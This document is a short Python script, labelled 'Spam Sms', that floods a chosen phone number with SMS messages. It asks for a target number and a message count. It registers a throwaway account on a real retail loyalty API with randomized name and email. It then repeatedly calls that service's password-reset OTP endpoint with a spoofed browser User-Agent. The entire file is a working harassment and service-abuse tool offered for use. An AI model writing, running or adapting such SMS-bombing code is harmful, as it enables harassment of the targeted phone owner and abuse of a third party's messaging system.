import requests
import json
import random
import string
from pyfiglet import Figlet
from printy import printy

f = Figlet(font='slant')

printy(f.renderText("Spam Sms"), "rB")
printy("author : @dakochann\n", "rB")


nomor = int(input("Masukkan Nomor Target : "))
berapa = int(input("Mau Kirim Berapa : "))

def daftar(nomor):
    url = 'https://cmsapi.mapclub.com/api/synectics/signup'

    data = {
    "name": ''.join(random.choice(string.ascii_lowercase) for i in range(10)),
    "phone": {nomor},
    "email": ''.join(random.choice(string.ascii_lowercase) for i in range(8)) + "@gmail.com",
    "birthDate": "1991-04-23",
    "gender": "MALE",
    "city": "ACEH JAYA"
    }

    response = requests.post(url, data=data)
    a = json.loads(response.content)
    if a["status"] == "ok":
        return True
    elif a["error"] == "Your account is registered, please enter your ID and password to login and enter the application. You can also use the forget password feature to create a new password or change your old password.":
        return True
    else:
        print("upsss error")
        return False

def proses(nomor, berapa):
    url = 'https://cmsapi.mapclub.com/api/reset-password-otp'
    data = {
    "username": {nomor}
    }

    for i in range(berapa):
        header = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}

        response = requests.post(url, data=data, headers=header)
        d = json.loads(response.content)
        if d["status"] == "ok":
            print(f'berhasil mengirim ke 0{nomor} {i + 1} kali')
        else:
            print(f"Gagal Mengirim Ke 0{nomor}")
    
if daftar(nomor) == True:
    proses(nomor, berapa)